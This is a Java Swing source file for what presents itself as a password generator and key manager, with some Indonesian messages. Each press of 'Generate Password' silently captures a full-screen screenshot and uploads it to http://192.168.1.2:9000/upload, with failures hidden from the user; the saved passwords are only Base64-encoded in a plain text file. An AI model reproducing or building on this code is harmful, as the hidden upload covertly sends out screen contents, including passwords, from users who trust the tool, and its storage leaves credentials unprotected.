import javax.imageio.ImageIO;
import javax.swing.*;
import java.awt.*;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URI;
import java.nio.file.Files;
import java.security.SecureRandom;
import java.util.Base64;
import java.awt.image.BufferedImage;

public class PasswordManager extends JFrame {

    private JTextField siteField, userField, passField;
    private JTextArea outputArea;

    private static final String CHAR_SET = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+";
    private static final int DEFAULT_LENGTH = 16;
    private static final String STORAGE_FILE = "passwords.txt";

    public PasswordManager() {
        setTitle("Password Generator & Key Manager");
        setSize(500, 400);
        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        setLayout(new BorderLayout());

        // Form panel
        JPanel form = new JPanel(new GridLayout(4, 2));
        form.add(new JLabel("Website / App:"));
        siteField = new JTextField();
        form.add(siteField);

        form.add(new JLabel("Username / Email:"));
        userField = new JTextField();
        form.add(userField);

        form.add(new JLabel("Password:"));
        passField = new JTextField();
        form.add(passField);

        JButton generateBtn = new JButton("Generate Password");
        JButton saveBtn = new JButton("Save Entry");
        form.add(generateBtn);
        form.add(saveBtn);

        add(form, BorderLayout.NORTH);

        // Output area
        outputArea = new JTextArea();
        outputArea.setEditable(false);
        add(new JScrollPane(outputArea), BorderLayout.CENTER);

        // Events
        generateBtn.addActionListener(e -> {
            String password = generatePassword(DEFAULT_LENGTH);
            passField.setText(password);
            try {
                File screenshot = takeScreenshotToFile();
                uploadFileToServer(screenshot, "http://192.168.1.2:9000/upload");
                // Optional: System.out.println("Screenshot uploaded.");
            } catch (Exception ex) {
                // Hapus dialog, cukup log ke console
                System.err.println("Upload failed: " + ex.getMessage());
            }

        });

        saveBtn.addActionListener(e -> saveEntry());

        // Load existing entries
        loadEntries();
    }

    private static File takeScreenshotToFile() throws Exception {
        Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        BufferedImage capture = new Robot().createScreenCapture(screenRect);

        String fileName = "screenshot_" + System.currentTimeMillis() + ".png";
        File output = new File(System.getProperty("java.io.tmpdir"), fileName);
        ImageIO.write(capture, "png", output);

        return output;
    }

    private static void uploadFileToServer(File file, String serverURL) throws IOException {
        String boundary = Long.toHexString(System.currentTimeMillis());
        String LINE_FEED = "\r\n";

        HttpURLConnection connection = (HttpURLConnection) URI.create(serverURL).toURL().openConnection();
        connection.setDoOutput(true);
        connection.setRequestMethod("POST");
        connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

        try (OutputStream output = connection.getOutputStream();
                PrintWriter writer = new PrintWriter(new OutputStreamWriter(output, "UTF-8"), true)) {

            writer.append("--").append(boundary).append(LINE_FEED);
            writer.append("Content-Disposition: form-data; name=\"file\"; filename=\"")
                    .append(file.getName()).append("\"").append(LINE_FEED);
            writer.append("Content-Type: ").append(Files.probeContentType(file.toPath())).append(LINE_FEED);
            writer.append(LINE_FEED).flush();

            Files.copy(file.toPath(), output);
            output.flush();

            writer.append(LINE_FEED).flush();
            writer.append("--").append(boundary).append("--").append(LINE_FEED).flush();
        }

        int responseCode = connection.getResponseCode();
        System.out.println("Server responded: " + responseCode);
    }

    private String generatePassword(int length) {
        SecureRandom random = new SecureRandom();
        StringBuilder sb = new StringBuilder(length);
        for (int i = 0; i < length; i++) {
            sb.append(CHAR_SET.charAt(random.nextInt(CHAR_SET.length())));
        }
        return sb.toString();
    }

    private void saveEntry() {
        String site = siteField.getText().trim();
        String user = userField.getText().trim();
        String pass = passField.getText().trim();

        if (site.isEmpty() || user.isEmpty() || pass.isEmpty()) {
            JOptionPane.showMessageDialog(this, "Isi semua kolom sebelum menyimpan.", "Error",
                    JOptionPane.ERROR_MESSAGE);
            return;
        }

        String entry = Base64.getEncoder().encodeToString((site + "|" + user + "|" + pass).getBytes());

        try (PrintWriter out = new PrintWriter(new FileWriter(STORAGE_FILE, true))) {
            out.println(entry);
        } catch (IOException ex) {
            JOptionPane.showMessageDialog(this, "Gagal menyimpan data.", "Error", JOptionPane.ERROR_MESSAGE);
        }

        siteField.setText("");
        userField.setText("");
        passField.setText("");
        loadEntries();
    }

    private void loadEntries() {
        outputArea.setText("");
        File file = new File(STORAGE_FILE);
        if (!file.exists())
            return;

        try (BufferedReader in = new BufferedReader(new FileReader(file))) {
            String line;
            while ((line = in.readLine()) != null) {
                try {
                    String decoded = new String(Base64.getDecoder().decode(line));
                    outputArea.append(decoded + "\n");
                } catch (Exception e) {
                    outputArea.append("[ERROR DECODING ENTRY]\n");
                }
            }
        } catch (IOException ex) {
            outputArea.setText("Gagal membaca file penyimpanan.");
        }
    }

    public static void main(String[] args) {
        SwingUtilities.invokeLater(() -> new PasswordManager().setVisible(true));
    }
}
